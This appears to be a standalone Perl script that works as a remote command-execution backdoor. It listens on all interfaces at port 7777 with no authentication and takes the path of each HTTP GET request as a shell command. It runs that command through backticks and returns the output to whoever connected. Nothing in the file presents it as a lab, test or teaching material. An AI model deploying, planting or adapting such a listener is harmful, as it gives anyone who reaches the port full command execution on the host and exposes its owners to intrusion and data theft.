#!/usr/bin/env perl

use strict;
use warnings;

use IO::Socket::INET;
# auto-flush on socket
$| = 1;

sub str_replace {
	my $replace_this = shift;
	my $with_this  = shift; 
	my $string   = shift;
	
	my $length = length($string);
	my $target = length($replace_this);
	
	for(my $i=0; $i<$length - $target + 1; $i++) {
		if(substr($string,$i,$target) eq $replace_this) {
			$string = substr($string,0,$i) . $with_this . substr($string,$i+$target);
		}
	}
	return $string;
}


# Creating a listening socket
my $socket = new IO::Socket::INET (
    LocalHost => '0.0.0.0',
    LocalPort => '7777',
    Proto => 'tcp',
    Listen => 5,
    Reuse => 1
);
die "Cannot create socket $!\n" unless $socket;

$SIG{INT} = sub { $socket->close(); exit 0; };

my $lastcmd = "";
my $output = "";

while(1) {
    my $client_socket = $socket->accept();

    # Get information about a newly connected client
    my $client_address = $client_socket->peerhost();

    # Read up to 1024 characters from the connected client
    my $data = "";
    $client_socket->recv($data, 1024);

    my $cmd = substr(
        $data,
        index($data, "GET /") + 5,
        index($data, "HTTP") - 6
    );

    $cmd = str_replace("%20", " ", $cmd);
    $output = `$cmd`;
    $client_socket->send("=> $cmd done:\n$output");
    print("=> $cmd done\n");
    sleep(3);
}
